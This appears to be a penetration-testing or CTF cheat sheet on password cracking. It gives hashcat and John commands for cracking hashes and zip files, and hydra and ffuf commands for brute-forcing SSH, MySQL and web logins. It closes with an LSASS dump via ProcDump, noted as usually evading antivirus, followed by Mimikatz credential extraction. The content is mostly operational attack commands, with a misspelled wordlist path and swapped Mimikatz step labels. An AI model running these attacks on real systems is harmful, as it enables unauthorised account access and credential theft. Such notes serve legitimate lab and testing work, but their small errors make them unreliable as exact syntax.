# Password Cracking
- https://book.hacktricks.xyz/generic-methodologies-and-resources/brute-force
- Anatomy of shadow file: https://www.cyberciti.biz/faq/understanding-etcshadow-file/
- Always start your password search with rockyou.
  - In ctf style challenges start with first 100 or 1000 entries.
- MD5 rainbow table md5 site
  https://www.md5online.org/md5-decrypt.html

## Hashes

- Basic dictionary attack

	  hashcat -a 0 -m <hash_type> --force <hash_file> /usr/share/worldist/rockyou.txt -r /usr/share/hashcat/rules/OneRuleToRuleThemAll.rule
  
- Brute force
  
	  hashcat -m <hash_type> -a 3 <hash_file> [<mask>]
  
  
## Zip Files

- Extract and crack single hash

	  zip2john anna.zip > file.hash
	  john file.hash -w /usr/share/wordlists/rockyou.txt >> pass.txt

- Extract and crack multiple hashes

	  for file in $(ls); do zip2john $file > $file.hash; done
	  for file in $(ls *.hash); do john $file -w /usr/share/wordlists/rockyou.txt >> pass.txt ; done

## Remote Logins

- MySQL

	  hydra -L <USERNAMES> -P <WORDLIST> <IP> mysql

- SSH

	  hydra -l <USERNAMES> -P <FULL_PATH_TO_PASS> <IP> -t 4 ssh
  
- Web Forms

	  hydra -l <USERNAMES> -P <WORDLIST> <IP> http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V
	  
- fuff

	  ffuf -request <REQUEST> -request-proto http -mode clusterbomb -w <WORDLIST>:FUZZ -fs 102



## Generating Wordlists

- **cewl**
  
  -crawl a website and extract words
  
- **crunch**

  -create bespoke wordlist from specified parameters
  
- **cupp**

	generate password lists based on user information     
    
## lsass dump

[Guide](https://www.onlinehashcrack.com/how-to-procdump-mimikatz-credentials.php)

- ### 1. Dump with ProcDump

  Dump the LSASS process from memory to disk using Sysinternals ProcDump. Since ProcDump is a signed Microsoft utility, AV usually doesnâ€™t trigger on it.  ProcDump creates a minidump of the target process from which Mimikatz can extract credentials.
  
  [ProcDump download](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump)
      
  - Local Usage:
  
 		procdump.exe -accepteula -ma lsass.exe lsass.dmp
    
  - Remote Usage: (if you do not want to / cannot put the sysinternals tools on disk)
 
		net use Z: https://live.sysinternals.com
		procdump.exe -accepteula -ma lsass.exe lsass.dmp
    
- ### 2. extract credentials with mimikatz
  
  [mimikatz download](http://blog.gentilkiwi.com/mimikatz)
  
  - Dump Credentials
	  
		mimikatz # sekurlsa::minidump lsass.dmp
  
  - Switch to minidump
 
		mimikatz # sekurlsa::logonPasswords